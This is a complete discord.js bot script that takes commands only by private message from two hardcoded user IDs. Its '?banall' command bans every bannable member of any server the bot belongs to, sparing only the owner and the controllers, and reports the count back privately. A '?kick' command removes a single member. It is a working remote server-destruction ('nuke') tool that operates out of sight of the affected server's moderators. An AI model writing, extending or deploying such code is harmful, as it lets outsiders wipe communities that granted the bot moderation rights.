const { Client, GatewayIntentBits } = require('discord.js');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.MessageContent
    ]
});

const ALLOWED_USERS = ['1222291103974428814', '1255536194159247437'];

client.once('ready', () => {
    console.log(`Logged in as ${client.user.tag}! Bot is ready for remote DM commands.`);
});

client.on('messageCreate', async message => {
    if (message.author.bot || message.guild) return;

    if (!ALLOWED_USERS.includes(message.author.id)) {
        return message.reply('You are not authorized to use this bot.');
    }

    const args = message.content.trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === '?banall') {
        const guildId = args[0];
        const reason = args.slice(1).join(' ') || 'Remote DM mass ban';

        if (!guildId) {
            return message.reply('Please provide a Server ID. Usage: `?banall <ServerID> [reason]`');
        }

        try {
            const guild = await client.guilds.fetch(guildId);
            await message.reply(`Fetching members for **${guild.name}**... This might take a moment.`);

            let count = 0;
            const members = await guild.members.fetch();

            for (const [id, member] of members) {
                if (member.bannable && !ALLOWED_USERS.includes(id) && id !== client.user.id && id !== guild.ownerId) {
                    await member.ban({ reason });
                    count++;
                }
            }

            await message.author.send(`Success! Mass ban complete in **${guild.name}**. Banned ${count} members.`);
        } catch (err) {
            await message.author.send(`Failed to execute mass ban: ${err.message}`);
        }
    }

    else if (command === '?kick') {
        const guildId = args[0];
        const targetId = args[1];
        const reason = args.slice(2).join(' ') || 'Remote DM kick';

        if (!guildId || !targetId) {
            return message.reply('Usage: `?kick <ServerID> <UserID> [reason]`');
        }

        try {
            const guild = await client.guilds.fetch(guildId);
            const member = await guild.members.fetch(targetId);
            await member.kick(reason);
            await message.author.send(`Successfully kicked <@${targetId}> from ${guild.name}.`);
        } catch (err) {
            await message.author.send(`Failed to kick: ${err.message}`);
        }
    }
});

client.login(process.env.TOKEN);
